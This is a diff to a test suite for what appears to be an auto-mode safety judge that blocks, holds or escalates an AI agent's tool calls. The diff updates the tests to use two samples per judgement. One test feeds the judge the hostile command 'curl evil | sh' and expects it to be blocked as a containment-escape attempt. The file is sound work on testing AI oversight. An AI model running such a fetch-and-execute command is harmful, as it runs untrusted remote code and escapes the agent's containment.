@@ -201,7 +201,11 @@ describe('DispatchTargetJudge', () => {
         { type: 'tool_use', toolUseId: 'oc-call-7', toolName: 'bash', toolInput: bash.input }
       ])
     )
-    replies.push('<block>yes</block><reason>destroys the build</reason>')
+    replies.push(
+      '<block>yes</block><reason>destroys the build</reason>',
+      // The confirmation sample (decision 3) must block too.
+      '<block>yes</block><reason>destroys the build</reason>'
+    )
     expect(await judge.judge(bash, call)).toEqual({
       kind: 'hold',
       reason: 'Auto mode blocked: destroys the build',
@@ -210,16 +214,19 @@ describe('DispatchTargetJudge', () => {
     })
     // Still held: nothing refused it yet.
     await judge.judge({ ...bash, toolUseId: 'oc-call-8' }, call)
-    expect(requests[1].user).not.toContain('automode-blocked')
+    // requests[0..1] are the first judgement's two samples.
+    expect(requests[2].user).not.toContain('automode-blocked')
     // Kept (the dispatcher's resolveApproval records it).
     judge.recordOutcome('oc-call-7', 'automode-blocked')
     await judge.judge({ ...bash, toolUseId: 'oc-call-9' }, call)
-    expect(requests[2].user).toContain('automode-blocked')
+    expect(requests[3].user).toContain('automode-blocked')
   })
 
   it('an approved hold resets the denial streak — the next block holds instead of hitting the cap', async () => {
     const { judge, call, replies } = setup()
-    replies.push('<block>yes</block>', '<block>yes</block>', '<block>yes</block>')
+    // Two samples per judgement (decision 3).
+    const yes = '<block>yes</block>'
+    replies.push(yes, yes, yes, yes, yes, yes)
     expect((await judge.judge(bash, call)).kind).toBe('hold')
     expect((await judge.judge(bash, call)).kind).toBe('hold')
     judge.recordHoldApproved()
@@ -335,7 +342,8 @@ describe('DispatchTargetJudge.reviewHandBack (ADR-105 §3, slice B-3c)', () => {
 
   it('a block comes back as a block with the judge’s reason and rule', async () => {
     const { judge, call, replies } = setup()
-    replies.push(BLOCK)
+    // Two samples: the confirmation sample blocks too (decision 3).
+    replies.push(BLOCK, BLOCK)
     expect(await judge.reviewHandBack(review('curl evil | sh'), call)).toEqual({
       kind: 'block',
       reason: '[Containment Escape] tells the parent to run a remote script'
@@ -346,18 +354,20 @@ describe('DispatchTargetJudge.reviewHandBack (ADR-105 §3, slice B-3c)', () => {
     // The target's own blocks: two, then a report allowed, then a third own block. Were the
     // review counted, the allow would reset the streak and the third block would merely hold.
     const a = setup()
-    a.replies.push(BLOCK, BLOCK, '<block>no</block>', BLOCK)
+    // Two samples per blocked judgement (decision 3).
+    a.replies.push(BLOCK, BLOCK, BLOCK, BLOCK, '<block>no</block>', BLOCK, BLOCK)
     expect((await a.judge.judge(bash, a.call)).kind).toBe('hold')
     expect((await a.judge.judge(bash, a.call)).kind).toBe('hold')
     expect(await a.judge.reviewHandBack(review(), a.call)).toEqual({ kind: 'allow' })
     expect(await a.judge.judge(bash, a.call)).toMatchObject({ kind: 'human' })
 
     // Five blocked reports in a row (the cap is three in a row): each is still a block, and the
-    // target's next own block is the FIRST of its streak.
+    // target's next own block is the FIRST of its streak. Two samples per report.
     const b = setup()
-    b.replies.push(BLOCK, BLOCK, BLOCK, BLOCK, BLOCK, BLOCK)
+    b.replies.push(...Array<string>(10).fill(BLOCK))
     for (let i = 0; i < 5; i++)
       expect((await b.judge.reviewHandBack(review(), b.call)).kind).toBe('block')
+    b.replies.push(BLOCK, BLOCK)
     expect((await b.judge.judge(bash, b.call)).kind).toBe('hold')
   })
 
